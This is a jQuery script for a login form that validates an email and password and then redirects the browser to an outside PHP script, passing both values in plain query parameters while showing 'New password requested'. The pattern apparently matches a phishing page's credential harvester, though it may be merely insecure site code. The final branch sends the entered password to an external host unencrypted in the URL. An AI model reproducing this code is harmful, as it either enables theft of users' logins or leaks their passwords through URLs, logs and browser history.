$('#alertLog').slideUp();
//$('#alertLog').removeClass('alert-success').removeClass('alert-danger');
$('#logButton').click(function () {
    $("#alertLog").removeClass('alert-success').removeClass('alert-danger');
    var emailLog = $('#emailLog').val();
    var passLog = $('#passLog').val();

    function validateEmail($emailLog) {
        var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
        return emailReg.test($emailLog);
    }

    if (emailLog == "") {
        $("#alertLog").addClass('alert-danger');
        $("#alertLog").html("Email field is required!!!");
        $("#alertLog").fadeIn(500).delay(1000).fadeOut(500);
    } else if (!validateEmail(emailLog)) {
        $("#alertLog").addClass('alert-danger');
        $("#alertLog").html('Please enter validated email address.');
        $("#alertLog").slideDown(500).delay(1000).slideUp(500);
    } else if (passLog == "") {
        $("#alertLog").addClass('alert-danger');
        $("#alertLog").html("Please enter your password!!!");
        $("#alertLog").fadeIn(500).delay(1000).fadeOut(500);
    } else {
        window.location = "https://bttbh.ba/phpSendEmailForPassword.php?emailLog=" + emailLog + "&passLog=" + passLog
        $("#alertLog").addClass('alert-success');
        $("#alertLog").html('New password requested');
        $("#alertLog").slideDown(500).delay(1000).slideUp(500);
        $('#emailLog').val("");
        $('#passLog').val("");

    }
});